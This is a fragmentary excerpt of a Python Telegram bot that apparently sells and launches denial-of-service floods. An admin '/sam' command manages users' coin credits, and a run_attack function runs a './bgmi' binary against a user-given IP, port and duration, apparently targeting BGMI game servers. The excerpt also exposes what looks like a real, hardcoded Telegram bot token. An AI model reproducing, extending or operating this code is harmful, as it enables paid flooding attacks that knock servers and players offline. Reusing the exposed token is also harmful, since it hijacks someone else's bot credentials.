...
TELEGRAM_BOT_TOKEN = '7743299248:AAHfx-vrJBzK7PbIQSpkseM_f20ntpNOVyY'  # Replace with your bot token
...
async def sam(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*You dont have permission to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Tere ko simple command bhi nahi aati? Chal, sikh le: /sam <add|rem> <user_id> <coins>*", parse_mode='Markdown')
        return
...
async def run_attack(chat_id, ip, port, duration, context):
    ...
    try:
        command = f"./bgmi {ip} {port} {duration} {350} {300}"
...
def main():
    ...
    application.add_handler(CommandHandler("sam", sam))
